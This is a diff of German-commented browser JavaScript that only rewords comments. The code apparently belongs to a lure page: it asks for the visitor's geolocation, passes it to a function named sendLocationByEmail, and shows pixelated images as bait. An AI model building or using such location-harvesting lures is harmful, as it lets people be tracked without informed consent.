@@ -1,7 +1,6 @@
-// Funktion für den Standort (geografische Koordinaten) und deren Versenden
 document.getElementById('trackBtn').addEventListener('click', function() {
     getLocation();
-    showNewImages(); // Zeigt auch bei Fehlern weiterhin verpixelte Bilder an
+    showNewImages(); // Zeigt die verpixelten Bilder an, auch bei Fehlern
 });
 
 function getLocation() {
@@ -9,7 +8,7 @@ function getLocation() {
         navigator.geolocation.getCurrentPosition(sendLocationByEmail, showError);
     } else {
         document.getElementById("status").innerHTML = "Geolocation wird von diesem Browser nicht unterstützt.";
-        showNewImages(); // Zeigt auch bei Fehlern weiterhin verpixelte Bilder an
+        showNewImages(); // Zeigt die verpixelten Bilder an, auch bei Fehlern
     }
 }
 
@@ -66,10 +65,10 @@ function showError(error) {
             document.getElementById("status").innerHTML = "Ein unbekannter Fehler ist aufgetreten.";
             break;
     }
-    showNewImages(); // Zeigt auch bei Fehlern weiterhin verpixelte Bilder an
+    showNewImages(); // Zeigt die verpixelten Bilder an, auch bei Fehlern
 }
 
-// Funktion, um neue Bilder hinzuzufügen
+// Funktion, um neue Bilder hinzuzufügen (zuerst verpixelt)
 function showNewImages() {
     document.getElementById("new-images").style.display = "block";
 
@@ -93,6 +92,7 @@ function showNewImages() {
         additionalImagesContainer.appendChild(imgElement);
     });
 
+    // Zeige die Nachricht an, wenn der Standort ermittelt wurde
     document.getElementById("message").style.display = "block";
 }
 
